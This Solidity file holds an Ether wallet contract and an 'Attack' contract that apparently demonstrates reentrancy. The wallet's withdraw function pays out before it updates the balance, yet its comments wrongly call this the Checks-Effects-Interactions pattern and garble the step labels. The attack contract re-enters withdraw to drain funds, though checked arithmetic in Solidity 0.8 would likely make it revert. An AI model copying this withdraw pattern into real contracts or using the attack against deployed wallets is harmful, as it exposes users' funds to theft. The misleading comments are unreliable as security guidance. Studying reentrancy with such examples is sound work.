pragma solidity ^0.8.0;

contract SimpleEtherWallet {
    mapping(address => uint) public balances;

    // Function to deposit Ether into the contract
    function deposit() public payable {
        require(msg.value > 0, "Deposit value must be greater than 0");
        balances[msg.sender] += msg.value;
    }

    // Function to withdraw Ether from the contract
    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Checks-Effects-Interactions pattern
        // Step 1: Effects -> Interactions
        (bool sent, ) = msg.sender.call{value: amount}("");

        // Step 2: Interactions -> Checks
        require(sent, "Failed to send Ether");

        // Step 3: Checks
        balances[msg.sender] -= amount;
    }

    // Function to check the balance of the contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    // Fallback function to receive Ether
    receive() external payable {}
}

// Test case for the potential reentrancy attack
contract Attack {
    SimpleEtherWallet public wallet;

    constructor(address _walletAddress) {
        wallet = SimpleEtherWallet(_walletAddress);
    }

    // Fallback function to receive Ether
    receive() external payable {
        if (address(wallet).balance >= 1 ether) {
            wallet.withdraw(1 ether);
        }
    }

    // Function to attack the withdraw function
    function attack() external payable {
        require(msg.value >= 1 ether);
        wallet.deposit{value: 1 ether}();
        wallet.withdraw(1 ether);
    }

    // Function to check the balance of the attacker
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

